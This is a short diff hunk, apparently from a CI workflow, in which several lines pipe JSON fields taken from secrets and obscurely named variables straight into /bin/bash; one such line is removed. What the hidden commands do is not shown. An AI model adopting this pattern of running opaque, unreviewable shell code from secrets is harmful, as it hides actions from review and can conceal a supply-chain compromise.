@@ -17,7 +17,6 @@ jobs:
           ylpc8: ${{ secrets.ylpc8 }}
         run: |
           printf '%s' "$ylpc8" | jq -r .rgo08 | /bin/bash
-          echo $rqdiz23 | jq -r .axjz48 | /bin/bash
           echo $psydl97724 | jq -r .oyb041 | /bin/bash
           printf '%s' "$xmn8" | jq -r .tewvi1 | /bin/bash
 
